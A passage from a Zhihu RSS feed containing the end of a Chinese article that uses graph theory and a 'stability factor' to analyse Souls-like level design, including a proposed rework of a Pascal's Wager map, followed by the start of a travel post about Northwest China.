data-original=\"https://pic3.zhimg.com/v2-20fddab56e53195def873bc236ce67a2_r.jpg\"></figure><p>图中拟合曲线为 <img src=\"https://www.zhihu.com/equation?tex=f%28x%29%3D10.903+x+-+0.9328\" alt=\"f(x)=10.903 x - 0.9328\" eeimg=\"1\"> ，拟合度 <img src=\"https://www.zhihu.com/equation?tex=R%5E2%3D0.8\" alt=\"R^2=0.8\" eeimg=\"1\"></p>\n<p>最后，我们不妨分析一下拟合过程中的“坏点”(即坐标轴远远偏离拟合曲线的点)。取3<img src=\"https://www.zhihu.com/equation?tex=%5Csigma\" alt=\"\\sigma\" eeimg=\"1\"> 为阈值，我们将这些坏点列在下面。</p>\n<p>亚诺尔隆德(一代)、大树洞&amp;灰烬湖、巨像墓地、魔王耀变、佐贺山的武士</p>\n<p>这几张地图都获得了比较高的玩家评价，但是我们计算出来的 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值却相对来说低很多。对于这几张地图我们如何分析呢？其实可以看到，这几张地图在各自游戏当中起到的作用往往不是“探索”而是“叙事”，让场景当中的奇观给玩家以冲击性，顺便补全世界观之类的。如果按照纯粹探索地图的角度来讲，灰烬湖、巨像墓地和魔王耀变，这三张地图都没什么好探索的...因此，我们再次对本文的理论适用范围做出限制——<b>以探索为主要驱动的3D箱庭式关卡。</b></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>对《帕斯卡契约》关卡修整的一个试探性结果</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>作为本文方法论的一个应用，我们试图拿出国产游戏《帕斯卡契约》当中稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值较低的一张图，并试图通过对场景的小幅度修改，来增加地图的连通性，使得该关卡的环路结构更加优秀。</p>\n<p>我们选取“海格姆”这张地图进行演示。首先,画出海格姆的最简逻辑图，与原地图并列，如下：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-3d6c116c5c3d6e792ed7e16eaf2be027_b.jpg\" data-size=\"normal\" data-rawwidth=\"1577\" data-rawheight=\"709\" class=\"origin_image zh-lightbox-thumb\" width=\"1577\" data-original=\"https://pic4.zhimg.com/v2-3d6c116c5c3d6e792ed7e16eaf2be027_r.jpg\"><figcaption>左侧为手绘海格姆地图，右侧为自然逻辑图</figcaption></figure><p>随后根据既约规则化简成最简逻辑图并整理，得</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-753ecfff16533418d710c22fb3fc0948_b.jpg\" data-size=\"normal\" data-rawwidth=\"1900\" data-rawheight=\"710\" class=\"origin_image zh-lightbox-thumb\" width=\"1900\" data-original=\"https://pic1.zhimg.com/v2-753ecfff16533418d710c22fb3fc0948_r.jpg\"><figcaption>左侧为最简逻辑图，右侧为整理后的最简逻辑图结构</figcaption></figure><p>计算最简逻辑图的结构数据，有</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-dfc5cb827be958ff1eae4d0374650cd8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1053\" data-rawheight=\"151\" class=\"origin_image zh-lightbox-thumb\" width=\"1053\" data-original=\"https://pic1.zhimg.com/v2-dfc5cb827be958ff1eae4d0374650cd8_r.jpg\"></figure><p>可以看到，海格姆这张地图的 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma%5E%7B%283%29%7D\" alt=\"\\gamma^{(3)}\" eeimg=\"1\"> 较低，只有0.7017，属于低 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类。</p>\n<p>我们能否通过进行简单的调整，将其修整为一个更高的 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值的普适类的关卡呢？</p>\n<p>我们仔细观察最简逻辑图，得知该图有两个驻点 <img src=\"https://www.zhihu.com/equation?tex=V_1\" alt=\"V_1\" eeimg=\"1\"> 和 <img src=\"https://www.zhihu.com/equation?tex=V_7\" alt=\"V_7\" eeimg=\"1\"> ，一个简单的想法是，将两个驻点引出一条边，与一个次邻顶相连，就可以将驻点消除，此时可以画出新的最简逻辑图。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-b6a7a472d5b0fc6e3b29705c6f4bbe7f_b.jpg\" data-size=\"normal\" data-rawwidth=\"1015\" data-rawheight=\"780\" class=\"origin_image zh-lightbox-thumb\" width=\"1015\" data-original=\"https://pic4.zhimg.com/v2-b6a7a472d5b0fc6e3b29705c6f4bbe7f_r.jpg\"><figcaption>初步修整的最简逻辑图</figcaption></figure><p>我们将这个最简逻辑图对应回原地图，就是在如图所示的位置两个红色方框区域内各添加一个单向门。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-69cf3cc082f516e24f1862166a2a1765_b.jpg\" data-size=\"normal\" data-rawwidth=\"1793\" data-rawheight=\"865\" class=\"origin_image zh-lightbox-thumb\" width=\"1793\" data-original=\"https://pic2.zhimg.com/v2-69cf3cc082f516e24f1862166a2a1765_r.jpg\"><figcaption>我们给出的两处需要添加单向门，设计者可以想象有很多种设置办法：从桥上踢落梯子到地面，以及推倒树桩将断桥连接起来</figcaption></figure><p>  此时的关卡 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值是多少呢？列表计算一下</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-bb245ecec29b1fa54888f3a4e766119d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"970\" data-rawheight=\"135\" class=\"origin_image zh-lightbox-thumb\" width=\"970\" data-original=\"https://pic2.zhimg.com/v2-bb245ecec29b1fa54888f3a4e766119d_r.jpg\"></figure><p>可以看到，此时的大幅提高从0.7017直接上升到0.9383，相当于从低 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类上升到中 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类，且十分接近高 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类的阈值0.94.</p>\n<p>更进一步的，我们再次观察新的最简逻辑图，我们惊讶的发现三个存档点 <img src=\"https://www.zhihu.com/equation?tex=V_1%E3%80%81V_4%E3%80%81V_6\" alt=\"V_1、V_4、V_6\" eeimg=\"1\"> ，其实都离 <img src=\"https://www.zhihu.com/equation?tex=V_7\" alt=\"V_7\" eeimg=\"1\"> 区域很近。也就是说，我们甚至可以将三个篝火合并为一个，此时也不会大幅增加玩家的跑图距离。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-17a7b331eedbac64d5821af953d5d39e_b.jpg\" data-size=\"normal\" data-rawwidth=\"1035\" data-rawheight=\"761\" class=\"origin_image zh-lightbox-thumb\" width=\"1035\" data-original=\"https://pic3.zhimg.com/v2-17a7b331eedbac64d5821af953d5d39e_r.jpg\"><figcaption>海格姆关卡单向门修正建议</figcaption></figure><p>此时，减少了篝火数量，加强了地图的连通性与立体感，半强制性的要求玩家更深刻的理解地图结构，使得玩家在关卡探索结束后，对地图的整体满足感上升。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-30428185b2dc0b70d713cb3bcd1c9b62_b.jpg\" data-size=\"normal\" data-rawwidth=\"1793\" data-rawheight=\"865\" class=\"origin_image zh-lightbox-thumb\" width=\"1793\" data-original=\"https://pic3.zhimg.com/v2-30428185b2dc0b70d713cb3bcd1c9b62_r.jpg\"><figcaption>海格姆关卡存档点修正建议</figcaption></figure><p>综上，我们对《帕斯卡契约》海格姆地图的修改建议是，在黄色三角形位置添加存档点，并且删去其他所有存档点。在图中所示的三个红框位置添加单向门。此时，关卡的连通度会大大提高。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>结论</h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>什么是<b>“魂味”</b>？</p>\n<p>回到我们最开始的那个问题，现在，我们终于敢于正面回答这个问题了。</p>\n<p>所谓<b>“魂味”</b>，在关卡逻辑方面，意指地图中存在优秀的、丰富的、多层次的环路结构。</p>\n<p>——这三个形容词一个都不能少，环结构的链不能太冗余，否则就不够“优秀”，稳定度差。数目太少也不行，但是只堆数目也不行。环结构大的层次(高阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数)，表现为首尾至少要相连，极大环才不会出现驻点。要有很多细致的层次(高阶 <img src=\"https://www.zhihu.com/equation?tex=Cheeger\" alt=\"Cheeger\" eeimg=\"1\"> 数也要高)这样才叫一个有<b>“魂味”</b>的关卡。</p>\n<p>如何定量描述<b>“魂味”</b>？——我们可以通过计算关卡的稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> ，来定量化的描述<b>“魂味”</b>的多与少，乃至与其他地图的<b>“魂味”</b>浓度做比较。</p>\n<p>对于不同类魂游戏，如何评价他们的<b>“魂味”</b>？——计算各个游戏全部关卡的稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> ，将所有关卡归入三个关卡普适类当中，看看他们的关卡在各个普适类中占比多寡。</p>\n<p>如何设计一张类魂地图？能否设计出一张超越FS社的类魂地图？一张设计的不好的地图，如何修改成为一张好的类魂地图？</p>\n<p>1)画出一张连通度大于等于2的最简逻辑图，根据最简逻辑图构建自己的类魂地图。</p>\n<p>2)能，不仅能，而且比魂系列关卡更好的环路结构理论上存在很多很多，魂系列本身也有很多关卡设计的很差。模仿魂的类魂游戏有一些关卡做的也比魂要好，比如帕斯卡的圣塔和赐福之地。</p>\n<p>魂系列之所以还没被超越，是因为截至目前，没有任何一款类魂游戏当中，高 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类关卡占比大于魂系列的任何一部作品。</p>\n<p>3)画出最简逻辑图，找出驻点，将驻点与次近邻点用不动键相连，检验新的地图稳定因子是否符合标准，成功之后，回到原地图去添加捷径。</p>\n<p>到这里，关于类魂关卡的几个一直以来比较模糊的问题，现在算是有了部分解答。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>下面笔者还是来回答几个大概会来自关卡策划朋友的疑问：</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p><b>Q：</b>本文所讲的以计算稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 为评判标准的方法，是否过于教条，以至于限制设计者的想象力？</p>\n<p><b>A：</b>笔者不这么认为，首先，本文传达的是一种方法论，就是绘制关卡的最简逻辑图来研究关卡的方法。稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 是一个构造出来的观察量，我们用的次数多一点而已，并不是规定了关卡必须拥有一个高 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值。正如我们之前所述，几张叙事驱动的地图在低 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值下，依然获得了玩家的好评。</p>\n<p>此外有这样一个数学结果。6个顶连通图的个数为26704，7个顶的连通图数目为186万，对于8个顶的图，这个数字是2亿5千万。</p>\n<p>而这才仅仅是8个顶，一般的类魂游戏关卡最简逻辑图，顶数大概是10个左右。也就是说，当笔者开始拿起图论作为工具时，事实上已经极大的扩充了可能存在的关卡数目。</p>\n<p>试想，数以万亿计的连通图，他们都是潜在可能的游戏关卡，而这个数字远超过人类电子游戏史上所有已经设计出来的箱庭式关卡的总和。这难道不是极大的拓展了设计者的“可想象空间”么？怎么会限制设计者的“想象力”呢？</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-3ed172418660c098f20e73bbfa9aafa5_b.jpg\" data-size=\"normal\" data-rawwidth=\"1412\" data-rawheight=\"455\" class=\"origin_image zh-lightbox-thumb\" width=\"1412\" data-original=\"https://pic2.zhimg.com/v2-3ed172418660c098f20e73bbfa9aafa5_r.jpg\"><figcaption>左侧图被称作$K_{3,3}$或汤玛森图，是最简单的连通度为3的图结构。中间的图结构被称作彼得森图，连通度为4,具有很多奇特的性质。右侧的图为花蛇$J_5$，性质与彼得森图类似。</figcaption></figure><p>如上图所示的三个图结构，在图论里面以其优秀的环路结构性质而著称，但是截至目前为止，并未有任何一款类魂游戏的地图逻辑结构给出类似上述三图的结构，也就是说，在图论当中蕴含着许多优秀关卡的原型。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p><b>Q：</b>关卡是很复杂的，关卡设计里面还有很多，引导、美术、光影、叙事等等一系列要素，都能印象玩家的沉浸感，为什么没纳入讨论？你这么简化真的合理吗？</p>\n<p><b>A：</b>是的，您讲的没错，但是本文的讨论范围仅限于关卡的逻辑结构，本理论也仅适用于讨论关卡逻辑结构。至于本理论是否有效，请见第5章，我们对关卡的稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 与玩家满意度两个变量做的相关性检验。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>最后，还是总结一下本文的构建出来的这一套研究关卡的方法吧。</p>\n<p><b>1.绘制关卡的地图，标注各类兴趣点</b></p>\n<p><b>2.利用圆覆盖，划分关卡的各个开放区域</b></p>\n<p><b>3.根据划分的区域绘制“自然逻辑图”</b></p>\n<p><b>4.根据既约规则化简“自然逻辑图”，得到与关卡唯一对应的“最简逻辑图</b></p>\n<p><b>5.分析研究“最简逻辑图”中的数据，比如稳定因子</b> <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>在这套方法下，我们做了如下分析：</p>\n<p>依照几个最简单的构型的稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值，划分出三个关卡普适类，证明了五款市面上常见的类魂游戏底层设计逻辑是有本质区别的。</p>\n<p>最后利用调查文件的分数统计，得到了玩家对关卡的评价与稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值大致呈正相关的结论，验证了本理论的有效性。</p>\n<p>一些对本理论的展望是：</p>\n<p><b>对于尚未开始设计的关卡</b>，设计者不妨直接的画出一些高连通度的图结构，并且利用这些图结构帮助自己设计关卡；</p>\n<p><b>对于正在设计中的关卡</b>，本理论的出现，可以帮助设计者改善工作流，加快原型迭代；</p>\n<p><b>对于已经设计好的关卡</b>，设计者不妨算一算自己关卡的稳定因子 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值，如果不达标的话，可以分析最简逻辑图，适当添加不动键，让自己的关卡连通度更高。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2><b>鸣谢</b></h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>在本文的编写过程中，笔者利用了两位同好的手绘地图作为绘制自然逻辑图的背景，在此感谢纳闷虎与幻虚道长两位的辛勤贡献。</p>\n<p>在拆解地图的过程中，笔者也向王者遗灰Mod组的并非Nep、遗忘的银灵、神气的猫以及第一猎人的学徒等Mod制作者请教和学习了很多游戏解包与编辑器的使用，在此表述感谢。</p>\n<p>此外，感谢Darkbblue、零悠悠、晓渔、hsyt、Fourier等硬核玩家对于类魂关卡与其他游戏机制的解析，这些工作给予了笔者极大的启发。</p>\n<p>特别要感谢的是我的合作者Nori，他花费了很多的闲暇时间进入游戏跑图，在自然逻辑图的绘制上，也帮助了笔者很多。</p>\n<p>在此，感谢各位同好的贡献！如有侵权，请联系笔者，笔者会添加水印或相关修改提议。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>引用</h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//dl.acm.org/doi/abs/10.1145/1814256.1814257\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[1]</a>Dormans, Joris.2010.\"Adventures in Level Design: Generating Missions and Spaces for Action Adventure Games\"</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/86251818\" class=\"internal\">[2]</a>Darkbblue.2019.\"魂系列基础系统讲解 冲击力-韧性机制\"</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/54492745\" class=\"internal\">[3]</a>零悠悠.2019.\"关于连招理论以及反压制的解析\"</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/33679462\" class=\"internal\">[4]</a>晓渔.2018.\"失落的罗德兰: 浅谈《黑暗之魂》的地图设计\"</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//gameinstitute.qq.com/community/detail/110731\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[5]</a>hsyt.2016.\"我走过最长的路，是你的套路-黑暗之魂3关卡设计分析\".腾讯游戏学堂</p>\n<p><a href=\"https://link.zhihu.com/?target=http%3A//gamestudies.org/1501/articles/vella/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[6]</a>Daniel Vella.2015.\"No Mastery Without Mystery: Dark Souls and the Ludic Sublime\"</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//www.amazon.cn/dp/B01EIE3L7W\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[7]</a>Tracy Fullerton.2017.\"Game Design WorkShop\"</p>\n<p><a href=\"https://link.zhihu.com/?target=http%3A//www.dcs.shef.ac.uk/intranet/teaching/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[8]</a>Adams,David.2002. Automatic Generation of Dungeons for Computer Games. Bachelor thesis, University of Sheffield</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//arc.aiaa.org/doi/abs/10.2514/1.A32578\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[9]</a>Dale C. Arney,Alan W. Wilhite.2014.\"Modeling Space System Architectures with Graph Theory\"</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//www.proquest.com/openview/6a4c85b91e946807103f93fd56826147/1%3Fpq-origsite%3Dgscholar%26cbl%3D18750\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[10]</a>Arney, Dale Curtis.2012.\"Rule-based graph theory to enable exploration of the space system architecture design space\"</p>\n<p><a href=\"https://link.zhihu.com/?target=http%3A//gamestudies.org/0601/articles/dormans\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[11]</a>Joris Dormans.2006.\"On the Role of the Die: A brief ludologic study of pen-and-paper roleplaying games and their rules\"</p>\n<p><a href=\"https://link.zhihu.com/?target=http%3A//www.diva-portal.org/smash/get/diva2%3A935733/FULLTEXT01.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[12]</a>Valdemar Ribbing, Laban Melander.2016.\"Examining the Souls's series level design\"</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1vb411E7TS\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[13]</a>纳闷虎.2019.\"[仁王]手绘地图高清重绘\"</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//www.bilibili.com/video/av29599136\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[14]</a>纳闷虎.2018.\"[黑暗之魂3]手绘地图攻略\"</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//www.bilibili.com/read/cv6739466\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[15]</a>幻虚道长.2020.\"萌新向，帕斯卡契约全七章手绘地图\"</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>附录</h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-6622479974743584059d02c22bff36c4_b.jpg\" data-size=\"normal\" data-rawwidth=\"2346\" data-rawheight=\"2525\" class=\"origin_image zh-lightbox-thumb\" width=\"2346\" data-original=\"https://pic1.zhimg.com/v2-6622479974743584059d02c22bff36c4_r.jpg\"><figcaption>魂1绘画世界、底层、城外不死镇、地下墓地、病村、北方不死院的最简逻辑图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-bcc2953561204b7609633206439b1b24_b.jpg\" data-size=\"normal\" data-rawwidth=\"2013\" data-rawheight=\"2820\" class=\"origin_image zh-lightbox-thumb\" width=\"2013\" data-original=\"https://pic1.zhimg.com/v2-bcc2953561204b7609633206439b1b24_r.jpg\"><figcaption>魂1全流程、恶魔遗迹、小隆德遗迹、乌拉席露、塞恩古城、黑森林庭院的最简逻辑图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-64152ee34cc8abe0e351c2bda89cccaa_b.jpg\" data-size=\"normal\" data-rawwidth=\"1913\" data-rawheight=\"2803\" class=\"origin_image zh-lightbox-thumb\" width=\"1913\" data-original=\"https://pic3.zhimg.com/v2-64152ee34cc8abe0e351c2bda89cccaa_r.jpg\"><figcaption>魂1亚诺尔隆德、地下监牢、不死聚落、大书库、魂3全流程、卡萨斯地下墓地的最简逻辑图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-097c1721d9d4c957253dad96f927b6ed_b.jpg\" data-size=\"normal\" data-rawwidth=\"1990\" data-rawheight=\"2604\" class=\"origin_image zh-lightbox-thumb\" width=\"1990\" data-original=\"https://pic2.zhimg.com/v2-097c1721d9d4c957253dad96f927b6ed_r.jpg\"><figcaption>伊鲁席尔、熏烟湖、魂3亚诺尔隆德、洛斯里克城、妖王庭院、洛斯里克高墙的最简逻辑图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-377ecf72e369a5fe14f072ff3ab2b72e_b.jpg\" data-size=\"normal\" data-rawwidth=\"1769\" data-rawheight=\"2637\" class=\"origin_image zh-lightbox-thumb\" width=\"1769\" data-original=\"https://pic3.zhimg.com/v2-377ecf72e369a5fe14f072ff3ab2b72e_r.jpg\"><figcaption>罪业之都、噩梦边境、法兰要塞、大教堂区、拜尔沃金斯、幽邃教堂的最简逻辑图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-0c8a5ff6046eebe5911637dcf1d17f29_b.jpg\" data-size=\"normal\" data-rawwidth=\"1668\" data-rawheight=\"2622\" class=\"origin_image zh-lightbox-thumb\" width=\"1668\" data-original=\"https://pic2.zhimg.com/v2-0c8a5ff6046eebe5911637dcf1d17f29_r.jpg\"><figcaption>教学大楼、猎人的噩梦、该隐赫斯特、旧亚楠、禁忌森林、亨维克阴森小巷的最简逻辑图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d24250c13943197f8879343ca95f29cb_b.jpg\" data-size=\"normal\" data-rawwidth=\"2142\" data-rawheight=\"2921\" class=\"origin_image zh-lightbox-thumb\" width=\"2142\" data-original=\"https://pic4.zhimg.com/v2-d24250c13943197f8879343ca95f29cb_r.jpg\"><figcaption>曼西斯梦魇、血源诅咒全流程、未见村亚哈革、亚楠城、小渔村的最简逻辑图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-35d0674f1ce7304dd6f168cebaa4c54d_b.jpg\" data-size=\"normal\" data-rawwidth=\"1929\" data-rawheight=\"2292\" class=\"origin_image zh-lightbox-thumb\" width=\"1929\" data-original=\"https://pic2.zhimg.com/v2-35d0674f1ce7304dd6f168cebaa4c54d_r.jpg\"><figcaption>研究大厅、阿达米亚、海格姆、地下溶洞、赐福之地、治愈教会上层的最简逻辑图</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d1a1110ea47f782489256c35fa8182c7_b.jpg\" data-size=\"normal\" data-rawwidth=\"1677\" data-rawheight=\"2314\" class=\"origin_image zh-lightbox-thumb\" width=\"1677\" data-original=\"https://pic4.zhimg.com/v2-d1a1110ea47f782489256c35fa8182c7_r.jpg\"><figcaption>伊西索亚、圣所、基布塔、圣塔、伊迪斯、伊瑟流姆的最简逻辑图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-01cb3772c9868246d26c0afb632704fc_b.jpg\" data-size=\"normal\" data-rawwidth=\"2007\" data-rawheight=\"2275\" class=\"origin_image zh-lightbox-thumb\" width=\"2007\" data-original=\"https://pic1.zhimg.com/v2-01cb3772c9868246d26c0afb632704fc_r.jpg\"><figcaption>恶鬼栖息之岛、沉睡的灵石、不净灵山、比睿山的魔物、蠢动的银矿、对彼岸的思念的最简逻辑图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d8e8442ec09151769b5ad4425643c96d_b.jpg\" data-size=\"normal\" data-rawwidth=\"1875\" data-rawheight=\"1826\" class=\"origin_image zh-lightbox-thumb\" width=\"1875\" data-original=\"https://pic2.zhimg.com/v2-d8e8442ec09151769b5ad4425643c96d_r.jpg\"><figcaption>魔王耀变、黑暗深处、海鸣又起、关原、横越伊贺、秽土之城的最简逻辑图</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-dff41520d10270ca5ca365e8a6d2bf73_b.jpg\" data-size=\"normal\" data-rawwidth=\"1671\" data-rawheight=\"1706\" class=\"origin_image zh-lightbox-thumb\" width=\"1671\" data-original=\"https://pic4.zhimg.com/v2-dff41520d10270ca5ca365e8a6d2bf73_r.jpg\"><figcaption>佐贺山的武士、潸然落雪、信贵山的蜘蛛、拥有精灵的男人的最简逻辑图</figcaption></figure><h2>备注</h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>本文为由知乎账号“尼莫”原创首发，笔者允许本文以任何形式引用或转载给任何群体、个人。但在转载或引用时，请注明本文的出处及原作者。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ni-mo-82-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">尼莫</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/415025159?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国庆假期有哪些适合情侣旅游的地方？","date":"2021-09-29 09:57:31","description":"\n<p>大西北旅行目的地推荐，适合情侣自驾游。</p>\n<p>我们走过的那些路，希望有更多人的足迹，得以重叠。</p>\n<p>像是时光交汇，我们彼此不相识，但是这些地方，会记得我们，曾经来过～</p>\n<h3>甘肃民勤沙漠雕塑公园</h3>\n<p>从高空望去，是甘肃腾格里沙漠，当你走近，又以为看到了海市蜃楼，奇幻不真实。其实这是一座占地面积硕大的沙漠雕塑公园，咱们暂且简称它叫“沙雕”。黄沙中，一座巨大的机器化的半身人像俯视着我，这座雕塑叫做《预言》。这70多件作品，背后是来自全球著名雕塑家的奇思妙想，每一件都是这贫瘠的荒漠之地上，独一无二的灵魂。</p>\n<p>这里没有任何交通工具，仅适合自驾游。我们当时行至一段无信号公路，而且附近没有加油站。所以自行前往的朋友，一定要注意加好油，带好食物和水。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8d82562f58f7ae6fa0e68cd05584853b_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-watermark=\"watermark\" data-original-src=\"v2-8d82562f58f7ae6fa0e68cd05584853b\" data-watermark-src=\"v2-38f51c384c456a10c4af926d00051809\" data-private-watermark-src=\"v2-a208957d219364c8c11b936b591d8253\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-80e86edad7740f2a8c081fe18827a62a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2268\" data-rawheight=\"4032\" data-watermark=\"watermark\" data-original-src=\"v2-80e86edad7740f2a8c081fe18827a62a\" data-watermark-src=\"v2-c17557e1f008d80afe6d2b67a7ff7ad4\" data-private-watermark-src=\"v2-16abb1dcae5f90fb5f0064c365d6b547\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-68e91694b0d4ebe1415b436f9cbe0102_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2268\" data-rawheight=\"4032\" data-watermark=\"watermark\" data-original-src=\"v2-68e91694b0d4ebe1415b436f9cbe0102\" data-watermark-src=\"v2-4d91f6d220543816be8b9ad9e8c002a0\" data-private-watermark-src=\"v2-15c38b48956079a0e2cc1bad1f2e8eee\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d3f167d78f2b6abcc442036fdd63765d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-watermark=\"watermark\" data-original-src=\"v2-d3f167d78f2b6abcc442036fdd63765d\" data-watermark-src=\"v2-5086d96b1d3d23ddcbe974f770d5d78a\" data-private-watermark-src=\"v2-fad312e90acb4d9f489b773bf39a2319\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e88b9bff8364e4a791eaeecafa183f83_720w.jpg?rss\" 